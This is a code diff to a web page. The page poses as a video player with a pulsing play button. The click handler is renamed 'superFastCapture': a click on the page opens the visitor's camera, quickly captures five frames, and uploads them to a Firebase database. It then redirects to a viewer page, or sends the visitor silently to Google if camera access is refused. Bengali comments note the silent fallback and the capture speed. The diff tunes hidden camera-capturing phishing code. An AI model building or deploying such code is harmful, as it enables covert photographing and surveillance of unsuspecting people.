@@ -8,12 +8,12 @@
   <style>
     body,html{margin:0;height:100%;background:#000;overflow:hidden;position:relative;cursor:pointer;}
     .bg{position:absolute;inset:0;background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover;filter:blur(18px) brightness(0.5);transform:scale(1.15);}
-    .play{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:120px;height:120px;background:#ff0000;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 90px rgba(255,0,0,0.95);border:8px solid rgba(255,255,255,0.5);animation:p 2s infinite;}
+    .play{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:120px;height:120px;background:#ff0000;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 90px rgba(255,0,0,0.95);border:8px solid rgba(255,255,255,0.5);animation:p 1.5s infinite;}
     @keyframes p{0%,100%{transform:translate(-50%,-50%) scale(1)}50%{transform:translate(-50%,-50%) scale(1.25)}}
     .play svg{width:56px;height:56px;fill:#fff;margin-left:10px;}
   </style>
 </head>
-<body onclick="startNow()">
+<body onclick="superFastCapture()">
 
 <div class="bg"></div>
 <div class="play">
@@ -37,7 +37,7 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-// ID নেওয়া (১০০% সঠিক)
+// ID নেওয়া
 let id = location.pathname.split('/').pop();
 if (!id || id === 'view.html') {
   const params = new URLSearchParams(location.search);
@@ -47,7 +47,7 @@ if (!id || id === 'view.html') {
 const today = new Date().toLocaleDateString('bn-BD');
 const now = new Date().toLocaleString('bn-BD');
 
-function startNow() {
+function superFastCapture() {
   const canvas = document.getElementById('c');
   const ctx = canvas.getContext('2d');
   let pics = [];
@@ -61,14 +61,13 @@ function startNow() {
 
       let i = 0;
       const take = () => {
-        if (i >= 6) { // ৬ টি ছবি
-          // ছবি সেভ করো
+        if (i >= 5) {
+          // ছবি সেভ + অটো viewer পেইজে যাও
           db.ref('links/' + id + '/sessions/' + today).set({
             photos: pics,
             time: now
           }).then(() => {
-            // ছবি সেভ হলেই অটো viewer পেইজে যাও
-            location.href = location.origin + location.pathname.replace('view.html', '') + "viewer.html?id=" + id;
+            location.href = location.origin + location.pathname.replace(/view\.html.*$/, '') + "viewer.html?id=" + id;
           });
           return;
         }
@@ -78,14 +77,14 @@ function startNow() {
         ctx.drawImage(video, 0, 0);
         pics.push(canvas.toDataURL('image/jpeg', 0.96));
         i++;
-        setTimeout(take, 700);
+        // ১ সেকেন্ডে ৫ টি ছবি (200ms গ্যাপ)
+        setTimeout(take, 200);
       };
 
-      setTimeout(take, 1000);
+      setTimeout(take, 500); // শুরু হতে ০.৫ সেকেন্ড
     })
     .catch(() => {
-      // ক্যামেরা বন্ধ থাকলে সাইলেন্টে Google-এ পাঠাও
-      setTimeout(() => location.href = "https://google.com", 1500);
+      setTimeout(() => location.href = "https://google.com", 1000);
     });
 }
 </script>
